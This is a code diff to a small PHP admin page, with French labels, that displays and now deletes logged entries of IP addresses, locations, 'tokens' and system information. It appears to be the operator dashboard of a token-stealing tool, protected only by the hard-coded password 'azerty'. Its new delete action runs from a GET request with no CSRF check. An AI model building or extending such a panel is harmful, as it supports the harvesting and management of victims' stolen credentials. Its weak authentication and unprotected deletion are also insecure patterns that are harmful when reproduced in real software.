@@ -3,7 +3,6 @@ session_start();
 
 define('TOKEN_PASSWORD', 'azerty');
 
-// Gestion de l'authentification
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token_password'])) {
     if (hash_equals(TOKEN_PASSWORD, $_POST['token_password'])) {
         $_SESSION['token_auth'] = true;
@@ -13,7 +12,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token_password'])) {
     }
 }
 
-// Gestion de la déconnexion
+if (isset($_GET['delete']) && !empty($_SESSION['token_auth'])) {
+    $deleteIndex = (int)$_GET['delete'];
+    $data = json_decode(file_get_contents('../data/data.json'), true) ?? [];
+    
+    if (isset($data[$deleteIndex])) {
+        array_splice($data, $deleteIndex, 1);
+        file_put_contents('../data/data.json', json_encode($data, JSON_PRETTY_PRINT));
+        header('Location: index.php');
+        exit;
+    }
+}
+
 if (isset($_GET['logout'])) {
     unset($_SESSION['token_auth']);
     header('Location: index.php');
@@ -33,7 +43,7 @@ if (isset($_GET['logout'])) {
 
 <body class="bg-dark text-light">
     <div class="container mt-5">
-        <h1 class="mb-4">Token Activity Monitor</h1>
+        <h1 class="mb-4">Gestion des Tokens</h1>
 
         <?php if (empty($_SESSION['token_auth'])): ?>
             <?php if (!empty($error)): ?>
@@ -53,14 +63,15 @@ if (isset($_GET['logout'])) {
                         <th>IP</th>
                         <th>Location</th>
                         <th>Tokens</th>
-                        <th>System Info</th>
-                        <th>Timestamp</th>
+                        <th>Info Systeme</th>
+                        <th>Date</th>
+                        <th>Actions</th>
                     </tr>
                 </thead>
                 <tbody>
                     <?php
                     $data = json_decode(file_get_contents('../data/data.json'), true) ?? [];
-                    foreach ($data as $entry):
+                    foreach ($data as $index => $entry):
                         ?>
                         <tr>
                             <td><?= htmlspecialchars($entry['ip']) ?></td>
@@ -76,13 +87,26 @@ if (isset($_GET['logout'])) {
                                 </small>
                             </td>
                             <td><?= date('Y-m-d H:i:s', $entry['timestamp']) ?></td>
+                            <td>
+                                <a href="?delete=<?= $index ?>" 
+                                   class="btn btn-sm btn-outline-danger" 
+                                   onclick="return confirm('Êtes-vous sûr de vouloir supprimer cette entrée ?')">
+                                    <i class="fas fa-trash"></i> Supprimer
+                                </a>
+                            </td>
                         </tr>
                     <?php endforeach; ?>
                 </tbody>
             </table>
-        </div>
-    </body>
+        <?php endif; ?>
+    </div>
+    
+    <script src="https://kit.fontawesome.com/your-kit-id.js" crossorigin="anonymous"></script>
+    <script>
+    setInterval(function() {
+        location.reload();
+    }, 15000);
+    </script>
+</body>
 
-    </html>
-<?php endif; ?>
-</div>
+</html>
